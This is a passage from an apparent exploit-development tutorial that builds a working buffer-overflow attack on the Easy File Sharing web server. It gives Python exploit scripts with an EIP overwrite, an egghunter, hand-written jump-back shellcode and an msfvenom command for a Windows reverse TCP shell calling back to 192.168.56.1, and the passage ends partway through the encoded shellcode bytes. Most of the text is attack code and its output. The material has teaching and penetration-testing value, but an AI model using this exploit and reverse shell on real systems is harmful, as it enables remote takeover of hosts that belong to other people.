	&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage: python EFS.py [IP]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;i.e python  EFS.py 192.168.56.101&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;c1&quot;&gt;#Bad Chars= \x25\x26\x27\x2b&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#push esp, ret 0x61c5203b&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3b\x20\xc5\x61&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x05\x5a\x74\xef\xb8\x72\x30\x30\x74\x89\xd7\xaf\x75&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xea\xaf\x75\xe7\xff\xe7&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Stage1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Egghunter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4072&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Stage1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST /sendmail.ghp HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Email=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;getPassword=Get+Password&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now lets launch the exploit. The result is very anticlimatic - Nothing happened! Our program does not crash, but it also does not look to be doing anything.
However if you open up the task manager, you will notice the CPU is running at 100% capacity. What is happening? Exactly what is supposed to be happening. Our EggHunter is looking through various pages of
memory looking for our “Egg”, however as we have not included it anywhere it just keeps searching indefinitely.&lt;/p&gt;

&lt;p&gt;To see the Egghunter working more clearly lets add our Egg somewhere. Modify the following lines as follows:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Stage2 = &quot;r00tr00t&quot;+&quot;\xcc&quot;*4064&lt;/code&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;crash = Stage2+EIP+&quot;\x90&quot;*16+Stage1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now, if we launch the exploit again we will see the CPU spike, but rather than running indefinitely we see our program suddenly pause. What happened?
If we take a look at the dissassembly and register windows we will see that EIP is pointing at our \xcc which acts as INT3 breakpoint. 
It has hit the breakpoint which if you notice we sent before our first stage shellcode. If we pay close attention to the eight bytes preceeding
the first INT3 instruction, we notice &lt;code class=&quot;highlighter-rouge&quot;&gt;7230307472303074&lt;/code&gt;, which is the hex equivalent of our r00tr00t signature! Our Egghunter has found the egg, and redirected execution flow to the bytes after our egg,
and executed out INT3 breakpoint which paused execution. From here on the only thing left to do is swap \xcc with some bind tcp shellcode and we will finally have access.&lt;/p&gt;

&lt;p&gt;Before this, lets take a look at our second option for redirecting execution&lt;/p&gt;

&lt;p&gt;4.2 - Writing Shellcode&lt;/p&gt;

&lt;p&gt;Just as it was the case with the Egg hunter, We will cover writing shellcode much more in different posts. For now we will focus on the minimum and simplest shellcode needed
to redirect execution flow.&lt;/p&gt;

&lt;p&gt;The way we are going to achieve this is to jump back into our stack. An msfvenom generated shell payload will be around 400 bytes, so if we place it right before our EIP address we will need to jump
back around ~400 bytes. Our Stage1 payload where we will write the code is at ESP, so we will use this address as our starting point. We are going to use the accumulator register (EAX) to perform our arithmetic by 
setting it equal to ESP, substracting 400 bytes and redirecting execution flow to it. Keeping our 52 byte restriction and our bad char restriction in mind, The resulting shellcode will be:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x54\x58&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;#PUSH ESP, POP EAX --&amp;gt; This sets the value of EAX to ESP by pushing the address of ESP onto the stack and popping it into EAX.&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x7F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7F       --&amp;gt; This substracts 127 bytes from EAX&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x7F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7F       --&amp;gt; This substracts 127 bytes from EAX&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x7F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7F       --&amp;gt; This substracts 127 bytes from EAX&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x13&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 13       --&amp;gt; This substracts 19  bytes from EAX&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x50\x5C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;#PUSH EAX #POP ESP --&amp;gt; This sets the value of ESP to EAX by pushing the address of EAX onto the stack and popping it into ESP.&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF\xE0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;#JMP EAX	          --&amp;gt; This redirects execution flow to EAX by jumping to it. &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After cleaning up and placing some padding, Our exploit code should look as follows:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;no&quot;&gt;Buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3712&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;351&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Staging&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x54\x58&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#PUSH ESP #POP EAX&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x7F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7C&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x7F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7C&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x7F&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7C&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xE8\x13&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#SUB EAX, 7C&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x50\x5C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#PUSH EAX #POP ESP&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF\xE0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#JMP EAX&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Stage1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Staging&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt; 			&lt;span class=&quot;c1&quot;&gt;# we add the additional 34 bytes to keep our 52 bytebuffer intact&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Stage2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xcc&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;363&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;#our shell will be 351 bytes, so jumping back 359 bytes gives us 8 bytes of padding between our Shell and EIP&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Padding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Stage2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Padding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Stage1&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST /sendmail.ghp HTTP/1.1 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Email=&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;crash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;getPassword=Get+Password&quot;&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;EFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s set a breakpoint and run the exploit again. As you step through it, pay attention to the EAX and ESP registers.
After we execute our jmp EAX, we can see that EIP was redirected to the buffer right before our shelcode. If we let it execute, we will see execution stop as soon as it reaches the INT3 instructions we sent
in the shellode variable.&lt;/p&gt;

&lt;p&gt;5) Choose second stage payload&lt;/p&gt;

&lt;p&gt;With execution redirected in both cases, the last step is to choose our second stage payload and swap out our shellcode. The payload will depend on many different things, such as our buffer size, and our 
targets configuration.
If we are breaching a target’s external perimieter, there will likely be a firewall in place. Opening up a port will most likely get flagged as malicious behavior, which may just crash the service and eliminate
our chances of exploiting the target again. Even if the code executes succesfully, the port may remain blocked by a firewall at the perimeter which again would eliminate our chances of getting in.&lt;/p&gt;

&lt;p&gt;A reverse shell is usually prefered. However, outbound connections may still be flagged as suspicious, or could also have connections to the destination port blocked. Consider what else is available. Is SSH
or remote desktop enabled? is the service running as a privileged user? If so, perhaps adding a user will suffice. There will be times when pre-packaged shellcode such as that generated by metasploit will not
work, forcing us to think creatively. Before launching your exploit against a production target, consider what a failed exploit will mean to your client and to the test.
Replicate the target as closely as possible first in a lab, and only once you are absolutely certain of your targets configuration and reliability of your exploit launch it.&lt;/p&gt;

&lt;p&gt;6) r00t dance&lt;/p&gt;

&lt;p&gt;Lets generate a reverse shell payload with msfvenom, remembering to encode the payload and define our badchars. The command I used is the following:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=445 -e x86/shikata_ga_nai -b \x00\x25\x26\x27\x2b -f c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This resutls in a payload that is 351 bytes which will fit in the buffer we created in our shell exploit. My finished Shell code exploit will look like this:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#Bad Chars= \x25\x26\x27\x2b\x00&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#PUSH ESP, RET 0x61c5203b&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x3b\x20\xc5\x61&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#PUSH ESP, RET 0x61c5203b&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage: python EFS.py [IP]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;i.e python  EFS.py 192.168.56.101&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;Buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3712&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.56.1 LPORT=445 -e x86/shikata_ga_nai -b \x00\x25\x26\x27\x2b -f c&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;Shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#352 bytes&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xba\x20\xb3\xd2\x36\xdb\xd8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x52\x31\x56\x12\x03\x56\x12\x83\xce\x4f\x30\xc3\xf2\x58\x37&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x2c\x0a\x99\x58\xa4\xef\xa8\x58\xd2\x64\x9a\x68\x90\x28\x17&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x02\xf4\xd8\xac\x66\xd1\xef\x05\xcc\x07\xde\x96\x7d\x7b\x41&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
